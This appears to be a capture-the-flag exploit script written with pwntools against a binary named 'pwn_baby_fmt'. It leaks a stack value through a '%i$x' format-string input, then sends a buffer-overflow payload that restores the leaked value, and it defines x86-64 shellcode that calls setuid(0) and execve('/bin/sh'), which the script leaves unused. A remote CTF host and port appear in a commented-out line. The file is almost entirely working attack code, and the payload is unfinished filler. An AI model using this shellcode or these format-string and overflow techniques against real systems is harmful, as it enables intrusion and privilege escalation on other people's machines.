from pwn import *


context.log_level = "CRITICAL"

IP = "35.234.100.160"
port = 32136

shellcode = "\x48\x31\xff\xb0\x69\x0f\x05\x48\x31\xd2\x48\xbb\xff\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x48\x31\xc0\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05\x6a\x01\x5f\x6a\x3c\x58\x0f\x05"

# found our random variable at index = 9
def leak_addresses(i):
    elf = ELF("./pwn_baby_fmt")
    p = elf.process()
    # p = remote(IP, port)
    rop = ROP(elf)

    # gdb.attach(p, gdbscript='''b gets@plt''')
    p.recvuntil("What's your town?\n")
    input = f"%{i}$x"
    p.sendline(input)
    p.recvuntil("Hello stranger. What town is this?\n")
    response = p.recvuntil("\n").rstrip()
    print(response)
    random_nr = int(response, base=16)

    print(f"{i}: {random_nr}")

    payload = [
        5*b"A",
        p64(random_nr),
        24*b"B",
        4*b"C"   
    ]
    payload = b"".join(payload)
    print(payload)
    p.recvuntil("Can you say hi in Chalcatongo?\n\n")
    p.sendline(payload)

    p.interactive()


for i in range(1, 100):
    leak_addresses(i)
# leak_addresses(9)
    